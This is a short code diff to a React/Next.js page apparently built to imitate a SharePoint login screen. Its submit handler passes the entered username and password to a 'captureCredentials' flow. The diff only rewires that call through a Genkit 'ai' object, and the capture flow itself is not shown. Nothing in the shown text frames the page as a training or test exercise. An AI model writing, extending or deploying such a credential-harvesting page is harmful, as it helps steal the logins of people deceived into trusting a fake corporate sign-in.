@@ -1,6 +1,6 @@
 'use client';
 import { FormEvent, useState } from 'react';
-import { captureCredentials } from '@/ai/flows/capture-credentials';
+import { ai } from '@/ai/genkit';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
@@ -25,7 +25,7 @@ export default function SharePointLoginPage() {
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
-    await captureCredentials({ username, password });
+    await ai.flow.captureCredentialsFlow({ username, password });
     setShowAlert(true);
   };
 
